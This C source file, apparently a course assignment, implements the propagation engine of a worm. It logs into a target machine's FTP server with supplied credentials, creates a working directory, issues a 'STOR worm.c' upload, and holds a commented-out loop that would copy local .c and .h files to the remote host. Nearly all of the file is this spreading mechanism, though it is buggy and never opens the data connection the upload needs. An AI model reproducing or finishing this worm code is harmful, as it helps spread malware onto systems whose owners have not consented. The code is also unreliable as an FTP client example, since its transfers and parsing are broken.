#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <fcntl.h>

void parseIPPort(char buffer[], char paramPORT[]){
    char *token = (char*) malloc(sizeof(char));
    char *aux = (char*) malloc(sizeof(char));
    int i = 0;
    
    /* get the first token */
    token = strtok(buffer, " ");
    printf("%s\n", aux);
   
    /* walk through other tokens */
    while(token != NULL) {
        aux = token;
        printf("%s\n", token);
        token = strtok(NULL, " ");
    }
 
    /* get the first token */
    token = strtok(aux, "(");
    aux = token;
    token = strtok(aux, ")");
    aux = token;
    printf("%s\n", aux);

}

void fileTransfer(char *ip, char *username, char *password){
    char buffer[1024];
    char paramPORT[50];
    char user[100] = "USER ";
    char pass[100] = "PASS ";
    char model[10] = "MODE S\n";
    char type[10] = "TYPE I\n";
    char stru[10] = "STRU F\n";
    char pasv[10] = "PASV\n";
    char cwd[100] = "CWD /home/";
    char cwdWD[100] = "CWD Asgn03KLG/\n";
    char pwd[10] = "PWD\n";
    char mkd[20] = "MKD Asgn03KLG\n";
    char storWorm[25] = "STOR worm.c\n";
    DIR *dir;
    FILE *arq;
    int sock = 0, len = 0, size = 0;
    struct sockaddr_in serverAddr;
    struct dirent *folder;
    struct stat obj;

    //CONNECT FTP
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        printf("Erro ao criar o socket.\n");
        exit(1);
    }  

    memset(&serverAddr, '0', sizeof(serverAddr));
    serverAddr.sin_addr.s_addr = inet_addr(ip);
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(21);

    if(connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0){
        printf("Erro: conexao falhou. \n");
        exit(1);
    }
    
    //Resposta do Connect
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando nome do usuario
    memset(buffer, '0', 1024);
    strcat(user, username);    
    printf("%s", user);
    if(send(sock, user, strlen(user), 0) < 0){
        printf("Erro: nome do usuario invalido ou incorreto. \n");
        exit(1);    
    }

    //Resposta do nome do usuario
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando senha
    memset(buffer, '0', 1024);
    strcat(pass, password);
    printf("%s", pass);
    if(send(sock, pass, strlen(pass), 0) < 0){
        printf("Erro: senha invalida \n");
        exit(1);
    } 

    //Resposta da Senha
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando Modo de Transferencia: Stream
    memset(buffer, '0', 1024);
    send(sock, model, strlen(model), 0);

    //Resposta do Modo
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
 
    //Enviando Tipo de Transferencia: Binario
    memset(buffer, '0', 1024);
    send(sock, type, strlen(type), 0);
    
    //Resposta do Tipo
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando Estrutura de Dados: F
    memset(buffer, '0', 1024);
    send(sock, stru, strlen(stru), 0);
    
    //Resposta da Estrutura de Dados
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando Passive Mode
    memset(buffer, '0', 1024);
    send(sock, pasv, strlen(pasv), 0);

    //Resposta do Passive Mode
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    parseIPPort(buffer, paramPORT);

    //Enviando comando 'CD'
    memset(buffer, '0', 1024);
    strcat(cwd, username);
    send(sock, cwd, strlen(cwd), 0);
    
    //Resposta do 'CD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
    
    //Enviando comando 'PWD'
    memset(buffer, '0', 1024);
    send(sock, pwd, strlen(pwd), 0);
    
    //Resposta do 'PWD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando comando 'MKD'
    memset(buffer, '0', 1024);
    send(sock, mkd, strlen(mkd), 0);
    
    //Resposta do 'MKD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando comando 'CD'
    memset(buffer, '0', 1024);
    send(sock, cwdWD, strlen(cwdWD), 0);
    
    //Resposta do 'CD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
    
    //Enviando comando 'PWD'
    memset(buffer, '0', 1024);
    send(sock, pwd, strlen(pwd), 0);
    
    //Resposta do 'PWD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando comando Worm.c
    memset(buffer, '0', 1024);
    send(sock, storWorm, strlen(storWorm), 0);
    
    //Resposta do Worm.c
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    if(sock >= 0){
        close(sock);
    }
}

void propagation_engine(char* ip, char *username, char *pass){
    
    fileTransfer(ip, username, pass);

    //catch files names and transfer via put ftp
   /* dir = opendir(".");
    if(dir){
        while(folder = readdir(dir)){
            if(!strcmp(folder->d_name, "."))
                continue;
            if(!strcmp(folder->d_name, ".."))
                continue;

            statFile = open(folder->d_name, O_RDONLY);
            if(statFile == -1){
                printf("No such file on the local directory\n\n");
                exit(0);
            } 

            len = strlen(folder->d_name);
            if (((len >= 2) && strcmp (&(folder->d_name[len - 2]), ".h") == 0) || ((len >= 2) && strcmp (&(folder->d_name[len - 2]), ".c") == 0)){
                strcpy(buffer, "put ");
                strcat(buffer, folder->d_name);
                send(sock, buffer, 100, 0);
                stat(folder->d_name, &obj);
                size = obj.st_size;
                send(sock, &size, sizeof(int), 0);
                sendfile(sock, statFile, NULL, size);
                recv(sock, &statFile, sizeof(int), 0);
                if(statFile)
                    printf("File stored successfully\n");
                else
                    printf("File failed to be stored to remote machine\n");
            }
        }
    }*/

}
